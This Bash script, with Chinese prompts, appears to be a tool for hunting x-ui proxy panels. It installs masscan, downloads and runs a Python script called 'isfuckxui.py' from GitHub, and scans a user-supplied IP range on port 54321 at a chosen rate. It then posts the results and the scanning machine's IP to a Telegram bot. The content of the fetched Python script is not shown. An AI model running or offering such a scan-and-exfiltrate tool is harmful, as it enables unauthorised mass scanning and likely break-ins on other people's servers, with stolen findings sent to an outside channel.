#! /bin/bash
upd(){
    apt-get update -y
    apt-get upgrade -y
    apt install masscan libpcap-dev python3 python3-pip -y
    pip3 install requests
}

pyzt(){
    curl -o isfuckxui.py https://raw.githubusercontent.com/AriesEDGE/fuckxui/main/isfuckxui.py
}

cvv(){
    python3 isfuckxui.py
}

tgbots(){
    echo "这台机器的IP是`curl ip.sb`" >> result.txt
    echo "你的telegram机器人token:"
    read TOKEN
    echo "你的telegram id(用于向你发送扫描结果)"
    read chat_ID
    if [ ! $TOKEN ] || [ ! $chat_ID ];then
        echo "不得为空"
        exit
    fi
    message_text=`cat result.txt`	
    MODE='HTML'
    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"	
    curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
}
upd
pyzt
echo "要扫描的ip段:"
read sbip
echo "最大扫描速率(pps):"
read fucku
masscan -p54321 ${sbip} --max-rate ${fucku} -oG scan.txt
cvv
tgbots

